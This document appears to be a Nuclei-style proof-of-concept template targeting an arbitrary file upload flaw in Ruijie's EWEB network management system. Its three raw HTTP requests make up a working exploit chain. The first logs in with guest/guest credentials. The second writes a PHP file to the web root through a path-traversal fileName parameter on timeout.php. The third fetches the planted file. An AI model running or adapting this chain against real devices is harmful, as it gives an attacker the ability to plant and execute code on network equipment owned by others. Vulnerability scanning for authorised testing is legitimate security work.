id: poc-sk5oq5q7ph6w0yb1
info:
  name: 锐捷网络-EWEB网管系统timeout存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: file-upload,2025
http:
- raw:
  - 'POST /ddi/server/login.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0

    Content-Length: 30

    Accept-Encoding: gzip, deflate, br

    Connection: keep-alive

    Content-Type: application/x-www-form-urlencoded

    Connection: keep-alive


    username=guest&password=guest?


    利用可用cookie带入上传接口'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /system_pi/timeout.php?a=upload HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36

    Content-Length: 62

    Accept: */*

    Accept-Encoding: gzip, deflate, br

    Accept-Language: zh-CN,zh;q=0.9

    Connection: keep-alive

    Content-Type: application/x-www-form-urlencoded

    Cookie: RUIJIEID=jftm33hn1crv2sehrdd79rjv36; path=/; HttpOnly;

    X-Requested-With: XMLHttpRequest

    Connection: keep-alive


    fileName=../tmp/html/112233.php&mes=<?php echo 1234567891011;?>


    访问文件'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /112233.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36

    Connection: keep-alive

    Cookie: RUIJIEID=jftm33hn1crv2sehrdd79rjv36

    Accept-Encoding: gzip, deflate, br'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
